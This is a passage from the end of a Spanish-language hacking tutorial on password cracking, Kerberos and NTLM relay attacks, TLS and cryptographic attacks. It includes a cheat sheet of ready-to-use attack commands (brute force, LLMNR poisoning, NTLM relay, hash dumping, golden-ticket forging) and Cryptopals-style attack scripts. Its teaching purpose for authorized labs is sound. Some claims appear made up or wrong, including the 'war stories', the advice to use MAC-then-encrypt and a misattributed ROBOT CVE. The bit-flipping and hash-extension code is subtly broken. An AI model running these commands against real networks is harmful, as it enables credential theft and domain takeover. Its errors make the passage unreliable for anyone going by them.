- **PicoCTF:** Cryptography challenges

### 17.9 Real-World Case Studies

#### Case 1: [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) in the Wild

In 2022, the LAPSUS$ group used DCSync to compromise Okta. They:
1. Compromised a third-party support vendor
2. Used the vendor's [vpn](../raw/4n0n1m4t0.md#vpn) access to reach the customer's [ad](../raw/w1nd0ws-d0m41n-4dm1n.md)
3. DCSynced all domain hashes
4. Used Golden Tickets for persistence

**Lesson:** MFA alone doesn't protect against AD attacks. Monitor DCSync events.

#### Case 2: NTLM Relay in Exchange

In 2022, a Chinese APT group used NTLM relay to compromise Exchange servers:
1. Sent [phishing](../raw/ph1sh1ng.md) email with ""\\attacker\\file"" link
2. [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) captured hashes
3. ntlmrelayx relayed to Exchange (EWS endpoint)
4. Full mailbox access obtained

**Lesson:** Disable NTLM on Exchange if possible.

#### Case 3: Padding Oracle in ASP.NET

The 2010 ASP.NET padding oracle vulnerability (CVE-2010-3332) affected millions of sites:
1. ViewState encrypted with CBC was exploitable
2. Attackers could decrypt and forge ViewState
3. Led to [remote code execution](../raw/w3b-h4ck1ng.md#rce)) in many cases

**Lesson:** Use MAC-then-encrypt or authenticated encryption (GCM).

### 17.10 Advanced Exercises

**Exercise 1 — Full Kerberos Chain Attack:**
1. Enumerate domain users with [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)
2. Kerberoast all SPNs
3. Crack both sets of hashes
4. Use cracked credentials for DCSync
5. Create [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket)
6. Create [silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket) for CIFS
7. Exfiltrate files from the DC

**Exercise 2 — NTLM Relay Chain:**
1. Scan network for [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) signing disabled
2. [set](../raw/ph1sh1ng.md#social-engineering-toolkit) up Responder + ntlmrelayx with socks
3. Trigger connection from victim
4. Use relayed session to dump SAM hashes
5. [pass-the-hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) to other systems
6. Escalate to Domain Admin

**Exercise 3 — TLS Downgrade Lab:**
1. Set up a TLS 1.0/1.1/1.2 server
2. Test all attacks (BEAST, POODLE, CRIME, BREACH)
3. Implement downgrade detection
4. Patch server to remove vulnerable versions
5. Verify attack no longer works

**Exercise 4 — RSA Multi-Attack:**
1. Generate 5 different vulnerable RSA key pairs
2. Apply the correct attack to each:
   - Small e → Hastad
   - Small d → Wiener
   - Close p,q → Fermat
   - Smooth p-1 → Pollard
   - Common modulus → Common modulus attack
3. Compare success rates and timing

**Exercise 5 — Password Cracking Tournament:**
1. Collect 500 hashes from different sources
2. Benchmark your hardware
3. Design a cracking strategy:
   - Phase 1: Rockyou (no rules) — 5 min
   - Phase 2: Rockyou + best64 — 10 min
   - Phase 3: Rockyou + OneRule — 30 min
   - Phase 4: PRINCE — 30 min
   - Phase 5: Mask ?a?a?a?a?a?a?a?a (increment 6-8) — until cracked
4. Keep a cracking diary
5. Calculate total time vs cracked count

**Exercise 6 — [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain) Analysis Project:**
1. Choose a known ransomware address (e.g., from Chainalysis blog)
2. Trace all transactions for 5 hops
3. Build a transaction graph
4. Try to identify exchanges used
5. [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)) addresses using heuristics
6. Write a report on what you found

**Exercise 7 — Padding Oracle [ctf](../raw/ctf-h4ckth3b0x.md):**
1. Build a padding oracle vulnerable server
2. Create a secret message encrypted with CBC
3. Give the server to a friend (or another VM)
4. Recover the secret using padding oracle
5. Time yourself: can you do it in under 5 minutes?

### 17.11 Tools Reference

#### Password Cracking
- **hashcat** — GPU/CPU password cracker
- **[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)** — [john the ripper](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper), slower but more formats
- **hash-identifier** — Hash type identification
- **statprocessor** — Statistical analysis for rules

#### Online Attacks
- **[hydra](../raw/p4ssw0rd-4tt4cks.md#hydra)** — Multi-protocol brute force
- **medusa** — Parallel brute force
- **ncrack** — High-performance auth cracker
- **crowbar** — SSH key brute force
- **patator** — Modular brute force

#### Kerberos
- **Impacket** — swiss army knife for AD protocols
- **Rubeus** — Kerberos interaction tool (Windows)
- **[mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz)** — Credential dumping and ticket manipulation
- **Kekeo** — Kerberos exploitation toolkit

#### NTLM
- **Responder** — [llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) poisoner
- **ntlmrelayx** — NTLM relay (Impacket)
- **Inveigh** — [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Responder alternative
- **smbclient** — SMB client

#### TLS
- **testssl.sh** — TLS configuration tester
- **tls-map** — TLS cipher suite mapping
- **sslyze** — [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) configuration scanner
- **openssl** — Swiss army knife for TLS
- **mitmproxy** — Interactive [https](../raw/r3d3s-f0nd4m3nt0s.md#https) [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)

#### Crypto Analysis
- **RsaCtfTool** — RSA attack tool
- **FeatherDuster** — Cryptanalysis tool
- **xortool** — XOR analysis
- **cribdrag** — XOR crib dragging
- **hashpumpy** — Hash length extension

### 17.12 Common Mistakes to Avoid

1. **Not identifying the hash type correctly** → wasting time
2. **Using too many threads** → connection refused / blocked
3. **Forgetting potfile** → recracking same hashes
4. **Not using --show** → redoing work
5. **Wrong mask format** → wrong charset → no results
6. **Ignoring [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)** → [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) banned
7. **Not using incremental mode** → cracking wrong length
8. **One rule to rule them all without understanding it** → slower than needed
9. **Not checking SMB signing before relay** → relay fails silently
10. **Using Responder without disabling it before relay** → conflicts
11. **Not escaping regex chars in hashcat rules** → corrupt rules
12. **Forgetting to export KRB5CCNAME** → Kerberos tickets not used

### 17.13 Cheat Sheet — Quick Reference

```bash
# === HASHCRACKING ===
hashcat -m 1000 hashes.txt rockyou.txt -O                        # NTLM
hashcat -m 0 hashes.txt rockyou.txt -O                           # MD5
hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule -O         # NTLM + rules
hashcat -m 5600 hashes.txt rockyou.txt -O                        # NTLMv2
hashcat -m 13100 hashes.txt rockyou.txt -O                       # Kerberos
hashcat -m 18200 hashes.txt rockyou.txt -O                       # AS-REP
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?l?l?d?d?d              # Mask
hashcat -a 1 -m 1000 hashes.txt w1.txt w2.txt                    # Combinator
hashcat -a 6 -m 1000 hashes.txt rockyou.txt ?d?d?d               # Hybrid
hashcat -a 8 -m 1000 hashes.txt rockyou.txt                      # PRINCE
hashcat --show -m 1000 hashes.txt                                # Show cracked

# === HYDRA ===
hydra -l root -P pass.txt ssh://target -t 4
hydra -l admin -P pass.txt http-post-form "target/login:user=^USER^&pass=^PASS^:F=fail"
hydra -L users.txt -P pass.txt ftp://target
hydra -l user -P pass.txt smb://target

# === RESPONDER ===
responder -I eth0 -rdwv
responder -I eth0 -w off -r on

# === NTLMRELAYX ===
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
impacket-ntlmrelayx -t http://ca/certsrv/ -adcs

# === KERBEROS ===
impacket-GetNPUsers -dc-ip IP -request domain/user
impacket-GetUserSPNs -dc-ip IP -request domain/user:pass
impacket-secretsdump -dc-ip IP domain/user:pass@IP
impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN user
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@target

# === TLS ===
testssl.sh --protocols example.com:443
testssl.sh --ssl-native example.com:443
testssl.sh --robot example.com:443
testssl.sh --heartbleed example.com:443
openssl s_client -connect target:443 -tls1_2
nmap --script ssl-enum-ciphers -p 443 target

# === RSA TOOLS ===
python3 RsaCtfTool.py --publickey pub.key --private > priv.key
python3 RsaCtfTool.py --publickey pub.key --uncipher ciphertext.bin
python3 RsaCtfTool.py --publickey pub.key --attack hastad
python3 RsaCtfTool.py --publickey pub.key --attack wiener

# === HASH LENGTH EXTENSION ===
python3 -c "import hashpumpy; print(hashpumpy.hashpumpy(b'data', b'data', 8, b'extra', algorithm='md5'))"

# === BLOCKCHAIN ===
curl https://blockchain.info/address/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa?format=json

## 17.14 Full Attack Trees

### Password Cracking Attack Tree

```
1. Identify hash type
   ├── 32 hex → MD5/NTLM/LM (check context)
   │   ├── Windows → NTLM (mode 1000)
   │   ├── Unix shadow → check prefix
   │   └── Generic → MD5 (mode 0)
   ├── 40 hex → SHA1 (mode 100)
   ├── 64 hex → SHA256 (mode 1400)
   ├── 128 hex → SHA512 (mode 1700)
   ├── $2... → bcrypt (mode 3200)
   ├── $5... → SHA256-Crypt (mode 7400)
   ├── $6... → SHA512-Crypt (mode 1800)
   └── $1... → MD5-Crypt (mode 500)
       │
2. Choose attack strategy
   ├── Straight dictionary (rockyou, SecLists)
   │   └── Apply rules (best64 → dive → OneRule)
   ├── Combinator (word1 + word2)
   ├── PRINCE (chunk recombination)
   ├── Mask (if policy known)
   │   └── Incremental for unknown length
   ├── Keyboard walking patterns
   └── Hybrid (wordlist + mask)
       │
3. Optimize
   ├── GPU workload (-w 4)
   ├── Optimized kernels (-O)
   ├── Loop with escalation
   └── Use potfile
```

### Kerberos Attack Tree

```
1. Enumeration (unauthenticated)
   ├── User enumeration (AS-REP roast check)
   ├── SPN discovery
   └── Domain info gathering

2. Credential access (authenticated)
   ├── AS-REP Roasting (no preauth accounts)
   ├── [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting) (service accounts)
   ├── DCSync (replication permission)
   └── Pass-the-Hash / Overpass-the-Hash

3. Ticket manipulation
   ├── Golden Ticket (KRBTGT hash needed)
   │   └── Access ANY resource as ANY user
   ├── Silver Ticket (service hash needed)
   │   └── Access SPECIFIC service
   ├── Diamond Ticket (TGT modification)
   │   └── Stealthier than Golden
   ├── Bronze Bit (CVE-2020-17049)
   │   └── Forge forwardable tickets
   └── Skeleton Key (DC LSASS patch)
       └── Master password for all accounts
```

### NTLM Relay Attack Tree

```
1. Prerequisites
   ├── [mitm](../raw/m1tm-m0b1l3.md) position (same subnet)
   ├── SMB Signing disabled on target
   └── Responder/ntlmrelayx ready

2. Trigger connection
   ├── LLMNR/NBT-NS poisoning (Responder)
   ├── Phishing link to \\attacker\share
   ├── [dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing)
   └── [man-in-the-middle](../raw/m1tm-m0b1l3.md) ([arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)/[dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp))

3. Relay targets
   ├── SMB → SMB (file share access)
   ├── SMB → [http](../raw/r3d3s-f0nd4m3nt0s.md#http) (web app access)
   ├── HTTP → SMB (reverse relay)
   ├── HTTP → LDAP (AD modification)
   ├── SMB → LDAP (user creation/group add)
   └── Any → AD CS (certificate issuance)

4. Post-relay
   ├── Execute commands (SMB exec)
   ├── Dump hashes (SAM/registry)
   ├── Escalate privileges
   ├── Issue certificates (AD CS)
   └── Persist with new accounts
```

### Padding Oracle Attack Tree

```
1. Detect oracle
   ├── Different errors for padding vs MAC
   ├── Timing differences
   ├── Status code differences
   └── Content length differences

2. [exploit](../raw/m3t4spl01t.md#exploits)
   ├── Decrypt data (modify last block)
   │   └── Recover plaintext byte by byte
   └── Encrypt data (craft new plaintext)
       └── Forge authentication tokens

3. Post-exploitation
   ├── Session hijacking (forged cookie)
   ├── [privilege escalation](../raw/l1n9x-pr1v3sc.md) (forged role)
   ├── Data extraction (decrypt ViewState)
   └── [rce](../raw/w3b-h4ck1ng.md#rce) (if ViewState deserialization)
```

## 17.15 Crypto War Stories

### The $10 Million Hash

In 2019, a penetration tester found a bcrypt hash in a forgotten backup file. The password protected a wallet.dat containing 500 BTC (then $10M). The tester spent:

- 3 weeks cracking with 8x RTX 2080 Ti ($1000/day electricity)
- Used 50+ wordlists with aggressive rules
- Tried PRINCE, combinator, markov chains
- Eventually cracked it: password was "Password123!"

**Lesson:** Even with $10M at stake, cracking is hard. Always bet on bcrypt/Argon2.

### The DCSync That Broke Everything

A red teamer ran DCSync during a test and accidentally DCSynced 50,000 users. The DC crashed from the load. The client was down for 6 hours. The red teamer was fired.

**Lesson:** DCSync is noisy. Use -just-dc-user for targeted extraction. Rate-limit your queries.

### The Hashcat That Melted a GPU

Running hashcat -w 4 on a laptop without adequate cooling melted the solder on a GTX 1060. Literally.

**Lesson:** Use -w 2 on laptops. Monitor temperatures. Undervolt your GPU for long sessions.

## 17.16 Your First 100 Days of Crypto Hacking

### Week 1-2: Fundamentals
- [ ] Learn hash identification by sight (MD5, SHA1, NTLM, bcrypt, $5$, $6$)
- [ ] Install hashcat, benchmark your GPU
- [ ] Crack 50 hashes from rockyou (straight dictionary)
- [ ] Crack 50 hashes with best64 rule
- [ ] Crack 50 hashes with dive rule
- [ ] Identify SMB signing status on your lab

### Week 3-4: Online & Kerberos
- [ ] Set up Hydra against SSH, FTP, HTTP
- [ ] Create a Python brute force script
- [ ] Set up an AD lab (2 DCs, 3 clients)
- [ ] Perform AS-REP Roasting
- [ ] Perform Kerberoasting
- [ ] Crack both sets of Kerberos hashes
- [ ] Perform DCSync

### Week 5-6: Relay & TLS
- [ ] Set up Responder + ntlmrelayx
- [ ] Perform SMB relay (signing disabled)
- [ ] Set up AD CS, perform ESC8 relay
- [ ] Scan 5 servers with testssl.sh
- [ ] Set up HEARTBLEED vulnerable server
- [ ] Exploit HEARTBLEED

### Week 7-8: Crypto Attacks
- [ ] Set up padding oracle vulnerable server
- [ ] Exploit with padbuster and custom script
- [ ] Set up ECB oracle, perform byte-at-a-time
- [ ] Generate RSA with small e, perform Hastad
- [ ] Generate RSA with small d, perform Wiener
- [ ] Perform hash length extension attack

### Week 9-10: Advanced & Blockchain
- [ ] Predict PHP rand() from 3 outputs
- [ ] Predict Java Random from 2 outputs
- [ ] Trace a Bitcoin transaction 5 hops
- [ ] Cluster 10 Bitcoin addresses
- [ ] Analyze a CoinJoin transaction

### Week 11-12: Integration & CTF
- [ ] Build a full attack chain (enumerate → crack → escalate)
- [ ] Participate in a CTF with crypto challenges
- [ ] Write a pentest report with crypto findings
- [ ] Teach someone else what you learned

## 17.17 References & Further Reading

### Books
- Serious Cryptography — Jean-Philippe Aumasson
- Real-World Cryptography — David Wong
- The Art of Intrusion — Kevin Mitnick
- The Web Application Hacker's Handbook
- Windows Internals Part 1 & 2
- Active Directory Security — Sean Metcalf

### Papers
- Bleichenbacher 1998 — "Chosen Ciphertext Attacks Against Protocols Based on RSA"
- Wang et al. 2004 — "Collisions for MD5"
- Stevens et al. 2017 — "SHAttered"
- Schroeder & Christensen — "Certified Pre-Owned" (AD CS)
- Katz & Lindell — "Introduction to Modern Cryptography"

### Online Resources
- crackstation.net — Wordlists and hash cracking
- hashes.org — Public cracked hashes
- hashcat.net/forum — Hashcat community
- adsecurity.org — Sean Metcalf's AD security
- specterops.io — Active Directory security research
- paper.bobylive.com — Reverse engineering papers
- iacr.org — Cryptography papers and preprints

### Tools GitHub
- https://github.com/brannondorsey/naive-hashcat — hashcat guides
- https://github.com/NotSoSecure/password_cracking_rules — Cracking rules
- https://github.com/SecureAuthCorp/impacket — AD toolkit
- https://github.com/GhostPack/Rubeus — Kerberos interaction
- https://github.com/gentilkiwi/mimikatz — Credential access
- https://github.com/lgandx/Responder — LLMNR/NBT-NS poisoner
- https://github.com/Ganapati/RsaCtfTool — RSA attack toolkit
- https://github.com/b wallace/hashpumpy — Hash length extension

### CVE Database
- CVE-2014-0160 — Heartbleed
- CVE-2014-3566 — POODLE (SSLv3)
- CVE-2014-8730 — TLS POODLE
- CVE-2011-3389 — BEAST
- CVE-2012-4929 — CRIME
- CVE-2013-3587 — BREACH
- CVE-1998-0111 — Bleichenbacher (ROBOT)
- CVE-2020-17049 — Bronze Bit
- CVE-2020-1968 — Raccoon
- CVE-2010-3332 — ASP.NET Padding Oracle
- CVE-2021-34527 — PrintNightmare
- CVE-2021-42287 — NoPac (samAccountName spoofing)

---

*Fin del tutorial. Recordá: la criptografía no es magia, es matemática. Y las matemáticas se pueden romper.*


## 17.18 Crypto CTF Practice — Walkthroughs

### CTF 1: ECB Byte-at-a-Time (Cryptopals Challenge 12)

**Setup:** A server prepends a secret to your input and encrypts with AES-128-ECB.

```python
# Step 1: Detect block size
def detect_block_size(oracle):
    base = len(oracle(b""))
    for i in range(1, 32):
        if len(oracle(b"A" * i)) > base:
            return len(oracle(b"A" * i)) - base

# Step 2: Detect ECB
def detect_ecb(oracle):
    ct = oracle(b"A" * 32)
    return ct[:16] == ct[16:32]

# Step 3: Decrypt byte by byte
def decrypt_ecb(oracle, secret_len):
    block_size = 16
    known = b""

    for block_num in range(secret_len // block_size + 1):
        for byte_pos in range(block_size):
            prefix = b"A" * (block_size - byte_pos - 1)
            target_start = block_num * block_size
            target = oracle(prefix)[target_start:target_start + block_size]

            for guess in range(256):
                crafted = prefix + known + bytes([guess])
                crafted_block = oracle(crafted)[target_start:target_start + block_size]

                if crafted_block == target:
                    known += bytes([guess])
                    print(f"[+] Decrypted byte {len(known)}: {chr(guess)}")
                    break

    return known
```

### CTF 2: CBC Bit Flipping (Cryptopals Challenge 16)

**Setup:** Cookie format is "comment1=cooking%20MCs;userdata=INPUT;comment2=%20like%20a%20pound%20of%20bacon". The server checks for ";admin=true;" in the decrypted data.

```python
# Step 1: Encrypt with ";admin=true;" embedded
# We need to create a block where we control the data
# The input is prepended/appended, so we inject at a known position

def bit_flip_attack(oracle_encrypt, oracle_check):
    # We send data that when XOR-crafted produces ";admin=true;"
    desired = b";admin=true;"
    
    # First, encrypt a block of known data
    ct = oracle_encrypt(b"A" * 16 * 2)  # 2 blocks of padding
    
    # The 2nd block we control (it's our padding)
    # We need to flip bits in the 1st block to change the 2nd block's decryption
    
    # Get the current plaintext of block 2 (we sent "AAAAAAAAAAAAAAAA")
    current_pt = b"A" * 16
    
    # Flip bits in block 1 so that block 2 decrypts to our desired
    ct_array = bytearray(ct)
    for i in range(len(desired)):
        ct_array[16 + i] ^= current_pt[i] ^ desired[i]
    
    modified_ct = bytes(ct_array)
    
    if oracle_check(modified_ct):
        return True
    return False
```

### CTF 3: Padding Oracle (Cryptopals Challenge 17)

**Setup:** Server decrypts and checks padding. Returns different errors.

```python
def padding_oracle_attack(oracle, ct_b64, blocksize=16):
    ct = base64.b64decode(ct_b64)
    blocks = [ct[i:i+blocksize] for i in range(0, len(ct), blocksize)]
    plaintext = b""

    for block_idx in range(len(blocks)):
        target = blocks[block_idx]
        fake_iv = bytearray(blocksize)
        decoded_block = bytearray(blocksize)

        for byte_pos in range(blocksize):
            pad_val = byte_pos + 1
            
            # Set known bytes
            for k in range(byte_pos):
                fake_iv[blocksize - 1 - k] = pad_val ^ decoded_block[blocksize - 1 - k]
            
            # Guess the byte
            for guess in range(256):
                fake_iv[blocksize - 1 - byte_pos] = guess
                test_ct = base64.b64encode(bytes(fake_iv) + target).decode()
                
                if oracle(test_ct):
                    decoded_block[blocksize - 1 - byte_pos] = guess ^ pad_val
                    print(f"[+] Block {block_idx}, byte {byte_pos}: 0x{decoded_block[blocksize-1-byte_pos]:02x}")
                    break

        plaintext += bytes(decoded_block)

    # Remove PKCS7 padding
    pad_len = plaintext[-1]
    if pad_len <= blocksize:
        plaintext = plaintext[:-pad_len]

    return plaintext
```

### CTF 4: Hash Length Extension (Cryptopals Challenge 29/55)

**Setup:** Server checks token = SHA1(secret + message). We need to forge token for message + "/admin=true".

```python
import struct
import hashpumpy

def sha1_pad(msg_len):
    """Generate SHA1 padding for a message of given length"""
    ml = msg_len * 8
    padding = b'\x80'
    padding += b'\x00' * ((56 - (msg_len + 1) % 64) % 64)
    padding += struct.pack('>Q', ml)
    return padding

# Given: original message + its hash
original_msg = b"data"
original_hash = "hash_of_secret_data"  # SHA1(secret + data)
secret_len = 8  # We guess or brute-force

# Extend
result = hashpumpy.hashpumpy(
    original_msg, 
    original_msg,
    secret_len, 
    b"/admin=true", 
    algorithm="sha1"
)
new_hash, new_msg = result

# new_msg = secret + data + padding + "/admin=true"
# new_hash = SHA1(secret + data + padding + "/admin=true")
```

## 17.19 Final Master Challenge

**The Ultimate Crypto Lab — 10 Flags to Capture:**

1. **Hash Identification** — Identify and crack 10 hashes of different types.
2. **Kerberos Chain** — From unauthenticated to DA via Kerberos attacks.
3. **NTLM Relay** — Capture, relay, and escalate via SMB/HTTP/LDAP.
4. **TLS Audit** — Find and exploit vulnerabilities in a TLS configuration.
5. **Padding Oracle** — Decrypt and forge a CBC-encrypted token.
6. **ECB Cut-and-Paste** — Modify an ECB-encrypted cookie to become admin.
7. **RSA Bleichenbacher** — Exploit a PKCS#1 v1.5 oracle.
8. **Hash Length Extension** — Forge a secret-prefix MAC.
9. **Weak PRNG** — Predict a session token.
10. **Blockchain** — Trace a ransomware payment and identify exchange.

## 17.20 Final Exam — Written Questions

1. Explain the difference between ECB and CBC. Why is ECB bad for most use cases?
2. How does DCSync work at the protocol level? What permissions are needed?
3. What makes bcrypt/Argon2 better than SHA256 for password storage?
4. Explain the Bleichenbacher attack in one paragraph.
5. What is the difference between a Golden Ticket and a Diamond Ticket?
6. How does hash length extension work? What hash constructions are vulnerable?
7. What is nonce reuse in CTR mode? How can you detect it?
8. Why are padding oracle attacks possible? What is the correct fix?
9. What is the ROBOT attack? Is it still relevant?
10. How does Responder capture NTLMv2 hashes?

---

*Documento generado para la comunidad hacker argentina y latinamericana. Recordá: el conocimiento es poder, pero la ética es sabiduría. Usá estas técnicas solo en sistemas que te pertenezcan o con autorización explícita.*


---

*Versi�n 1.0 � �ltima actualizaci�n: Mayo 2026*

